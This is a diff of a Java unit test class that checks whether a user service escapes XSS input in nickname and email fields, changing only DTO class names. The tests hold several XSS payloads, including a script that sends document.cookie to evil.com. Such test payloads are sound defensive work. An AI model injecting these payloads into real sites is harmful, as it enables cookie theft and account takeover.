@@ -1,13 +1,12 @@
 package com.adminplus.service;
 
-import com.adminplus.pojo.dto.req.UserCreateReq;
-import com.adminplus.pojo.dto.req.UserUpdateReq;
+import com.adminplus.pojo.dto.request.UserCreateRequest;
+import com.adminplus.pojo.dto.request.UserUpdateRequest;
 import com.adminplus.pojo.entity.UserEntity;
 import com.adminplus.repository.DeptRepository;
 import com.adminplus.repository.RoleRepository;
 import com.adminplus.repository.UserRepository;
 import com.adminplus.repository.UserRoleRepository;
-import com.adminplus.service.DeptService;
 import com.adminplus.service.impl.UserServiceImpl;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.DisplayName;
@@ -85,7 +84,7 @@ class UserServiceXssVerificationTest {
         void shouldEscapeXssInNicknameWhenCreateUser() {
             // Given
             String xssNickname = "<script>alert('xss')</script>";
-            UserCreateReq req = new UserCreateReq(
+            UserCreateRequest req = new UserCreateRequest(
                     "xssuser01",
                     "Password123!",
                     xssNickname,
@@ -121,7 +120,7 @@ class UserServiceXssVerificationTest {
         void shouldEscapeXssInEmailWhenCreateUser() {
             // Given
             String xssEmail = "<img src=x onerror=alert(1)>@test.com>";
-            UserCreateReq req = new UserCreateReq(
+            UserCreateRequest req = new UserCreateRequest(
                     "xssuser02",
                     "Password123!",
                     "Test User",
@@ -161,7 +160,7 @@ class UserServiceXssVerificationTest {
         void shouldEscapeXssInNicknameWhenUpdateUser() {
             // Given
             String xssNickname = "<iframe src=javascript:alert(1)></iframe>XSS";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     xssNickname,
                     null,
                     null,
@@ -190,7 +189,7 @@ class UserServiceXssVerificationTest {
         void shouldEscapeHtmlCharsInEmailWhenUpdateUser() {
             // Given
             String htmlEmail = "<>&\"'test@test.com";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     null,
                     htmlEmail,
                     null,
@@ -223,7 +222,7 @@ class UserServiceXssVerificationTest {
         @DisplayName("空字符串应正确处理")
         void shouldHandleEmptyString() {
             // Given
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     "",  // 空字符串
                     null,
                     null,
@@ -250,7 +249,7 @@ class UserServiceXssVerificationTest {
         @DisplayName("null 值应保持原值")
         void shouldKeepOriginalValueForNull() {
             // Given
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     null,  // 不更新
                     null,
                     null,
@@ -283,7 +282,7 @@ class UserServiceXssVerificationTest {
         void shouldEscapeScriptTagForStoredXss() {
             // Given
             String storedXss = "<script>fetch('https://evil.com?c='+document.cookie)</script>";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     storedXss,
                     null,
                     null,
@@ -314,7 +313,7 @@ class UserServiceXssVerificationTest {
         void shouldEscapeImgTagForReflectedXss() {
             // Given
             String reflectedXss = "<img src=x onerror=\"alert('XSS')\">";
-            UserUpdateReq req = new UserUpdateReq(
+            UserUpdateRequest req = new UserUpdateRequest(
                     reflectedXss,
                     null,
                     null,
